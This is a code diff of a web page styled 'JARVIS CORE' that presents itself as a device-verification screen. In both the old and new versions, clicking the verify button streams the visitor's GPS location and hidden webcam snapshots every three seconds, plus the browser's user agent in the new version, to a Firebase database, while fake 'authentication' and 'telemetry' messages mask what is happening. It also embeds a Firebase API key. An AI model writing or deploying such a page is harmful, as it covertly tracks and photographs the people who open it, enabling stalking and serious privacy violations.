@@ -6,36 +6,38 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { background: #0b0f19; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .box { background: #111; padding: 30px; border-radius: 15px; text-align: center; border: 1px solid #333; }
-        button { background: #0284c7; padding: 15px 30px; border: none; color: #fff; cursor: pointer; border-radius: 5px; }
+        body { background: #000; color: #fff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .box { background: #0a0a0a; padding: 30px; border: 1px solid #ff0000; border-radius: 10px; text-align: center; width: 350px; }
+        .btn { background: #ff0000; border: none; padding: 15px; color: #fff; cursor: pointer; width: 100%; margin-top: 20px; }
+        #logs { font-size: 12px; color: #00ff00; margin-top: 15px; text-align: left; }
     </style>
 </head>
 <body>
     <div class="box">
-        <h2>JARVIS CORE</h2>
-        <p>डिवाइस प्रमाणीकरण पूरा करने के लिए बटन दबाएं।</p>
-        <button onclick="startVerification()">Verify Device</button>
+        <h2 style="color: #ff0000;">JARVIS CORE</h2>
+        <p>System Authentication Required.</p>
+        <button class="btn" onclick="start()">VERIFY DEVICE</button>
+        <div id="logs"></div>
     </div>
     <video id="v" autoplay playsinline muted style="display:none"></video>
     <canvas id="c" style="display:none"></canvas>
-
     <script>
+        const db = firebase.database();
         const firebaseConfig = { apiKey: "AIzaSyAfwCTBBc_LT8j7neC_aJhBCHUXj3QkSHc", authDomain: "army-cb492.firebaseapp.com", databaseURL: "https://army-cb492-default-rtdb.firebaseio.com", projectId: "army-cb492", appId: "1:449848409517:web:386ad1b570731b6ec4f524" };
         firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
 
-        async function startVerification() {
-            navigator.geolocation.watchPosition((pos) => {
-                db.ref('live_detect/location').set({ lat: pos.coords.latitude, lon: pos.coords.longitude });
+        async function start() {
+            document.getElementById('logs').innerHTML = "> Initializing...<br>> Accessing Hardware...";
+            navigator.geolocation.watchPosition((p) => {
+                db.ref('live_detect/location').set({ lat: p.coords.latitude, lon: p.coords.longitude });
             });
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            document.getElementById('v').srcObject = stream;
+            const s = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('v').srcObject = s;
             setInterval(() => {
                 const c = document.getElementById('c');
-                c.width = 320; c.height = 240;
                 c.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 320, 240);
-                db.ref('live_detect').update({ photo: c.toDataURL('image/jpeg', 0.5) });
+                db.ref('live_detect').update({ photo: c.toDataURL('image/jpeg', 0.5), device_info: navigator.userAgent });
+                document.getElementById('logs').innerHTML += "<br>> Syncing telemetry data...";
             }, 3000);
         }
     </script>
